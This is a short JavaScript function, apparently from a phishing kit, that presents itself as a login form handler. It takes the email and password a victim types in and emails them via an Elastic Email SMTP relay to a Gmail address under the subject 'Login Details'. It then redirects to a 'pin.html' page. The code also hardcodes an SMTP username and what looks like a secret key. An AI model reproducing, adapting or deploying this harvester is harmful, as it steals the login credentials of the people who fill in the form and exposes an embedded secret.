function emailSend() {
  var email = document.getElementById('email').value.trim();
  var password = document.getElementById('password').value.trim();

  if (!email) {
    swal("Error", "Email is required", "error");
    return;
  }
  if (!password) {
    swal("Error", "Password is required", "error");
    return;
  }

  var messageBody = "Email: " + email + "<br/>Password: " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      console.log("Email send response:", message); // Log the response
      if (message === 'OK') {
        window.location.href = 'pin.html';
      } else {
        console.error("Email send failed response:", message);
        swal("Error", "Something went wrong. Please try again.", "error");
      }
    }
  ).catch(error => {
    console.error("Email send error:", error); // Log detailed errors
    swal("Error", "Email sending failed. Check console for details.", "error");
  });
}
